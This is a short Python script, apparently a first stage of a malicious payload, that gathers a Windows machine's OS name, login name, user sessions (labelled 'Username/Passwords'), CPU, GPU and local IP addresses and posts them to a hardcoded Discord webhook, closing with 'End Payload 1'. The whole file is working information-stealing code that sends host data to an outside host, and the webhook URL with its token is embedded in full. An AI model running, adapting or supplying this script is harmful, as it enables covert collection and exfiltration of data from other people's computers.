import os; import psutil
import requests; import platform
import wmi

print("Operating System:", os.name)
print("User Name:", os.getlogin())
print("Username/Password:", psutil.users())
print("CPU:", platform.processor())
print("GPU:")

# Connect WMI to the service 
c = wmi.WMI()

# Get GPU information 
for adapter in c.Win32_VideoController():
    print(adapter.Name)

connections = psutil.net_connections(kind="inet4")

# Extract IP addresses
ip_addresses = [conn.laddr.ip for conn in connections]

# Concatenate the IP addresses as a string
ip_addresses_str = ", ".join(ip_addresses)

# Format the message
message = f"```\nOperating System: {os.name}\nUser Name: {os.getlogin()}\nUsername/Passwords: {psutil.users()}\nNetwork: {ip_addresses_str}\nCPU: {platform.processor()}\nGPU: {adapter.Name}```"

# Set the Discord webhook URL
url = "https://discord.com/api/webhooks/1077742889116901447/cvBOyuZ_IOU4Lnj0_BbguTaCISiy0_WrgnsDY4VqYGlrc5-6t-7g25rahbxAjVdUal2H"

# Set the message payload
payload = {
    "content": message
}

# Send the message to the webhook
response = requests.post(url, json=payload)

# Check if the request was successful
if response.status_code == 204:
    print("Message sent successfully.")
else:
    print("Error sending message.")

# End Payload 1

